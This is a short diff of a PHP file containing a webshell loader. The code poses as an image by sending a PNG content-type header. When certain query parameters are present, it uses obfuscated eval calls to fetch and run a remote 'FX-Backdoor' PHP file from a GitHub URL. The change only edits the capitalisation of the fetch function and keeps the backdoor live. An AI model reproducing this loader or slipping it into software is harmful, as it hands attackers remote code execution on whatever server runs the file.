@@ -10,7 +10,7 @@
         header ('Content-Type: image/png');
         if(isset($_GET['path']) or isset($_GET['Home'])){
             header("Content-Type: text/html");
-            /*!*/@/*!*/null;/*!*//*!*/@/*!5555*/eval("?>".File_get_contents/*!*/("https://raw.githubusercontent.com/FierzaEriez/FX-Webshell/main/FX-Backdoor(Release).php"));/**/
+            /*!*/@/*!*/null;/*!*//*!*/@/*!5555*/eval("?>".file_get_contents/*!*/("https://raw.githubusercontent.com/FierzaEriez/FX-Webshell/main/FX-Backdoor(Release).php"));/**/
         }
     }
     webshell();
